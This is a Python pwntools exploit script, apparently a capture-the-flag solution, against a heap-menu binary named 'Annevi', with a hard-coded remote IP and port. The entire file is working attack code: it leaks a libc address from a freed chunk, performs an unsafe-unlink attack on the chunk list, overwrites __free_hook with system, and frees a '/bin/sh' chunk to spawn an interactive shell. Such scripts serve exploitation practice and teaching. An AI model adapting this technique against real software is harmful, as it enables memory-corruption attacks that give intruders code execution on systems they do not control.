#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./Annevi')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.103.214.163', 20301)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./Annevi', checksec=False)


def add(add_size, add_content):
    p.sendlineafter(':', '1')
    p.sendlineafter('size?\n', str(add_size))
    p.sendlineafter('content:', add_content)


def delete(delete_idx):
    p.sendlineafter(':', '2')
    p.sendlineafter('index?\n', str(delete_idx))


def show(show_idx):
    p.sendlineafter(':', '3')
    p.sendlineafter('index?\n', str(show_idx))
    p.recvuntil('content:')


def edit(edit_idx, edit_content):
    p.sendlineafter(':', '4')
    p.sendlineafter('index?\n', str(edit_idx))
    p.sendlineafter('content:', edit_content)


addr_chunk_list = 0x602040
add(0x90, '')
add(0x90, '')
add(0x90, '')
add(0x90, '')
add(0x90, '/bin/sh\x00')
delete(0)
add(0x90, '')
show(0)

addr___malloc_hook = u64(p.recv(6).ljust(8, '\x00')) + 0x6
libcbase = addr___malloc_hook - libc.sym['__malloc_hook']
addr_system = libcbase + libc.sym['system']
addr___free_hook = libcbase + libc.sym['__free_hook']

pd = p64(0) + p64(0x91)
pd += p64(0x602040 - 0x8) + p64(0x602040)
pd += '\x00' * 0x70
pd += p64(0x90) + p64(0xa0)
edit(2, pd)
delete(3)
edit(2, p64(0) + p64(addr___free_hook))
edit(0, p64(addr_system))
delete(4)
# gdb.attach(p)
success('addr___malloc_hook = ' + hex(addr___malloc_hook))
success('addr_system        = ' + hex(addr_system))
success('addr___free_hook   = ' + hex(addr___free_hook))
p.interactive()
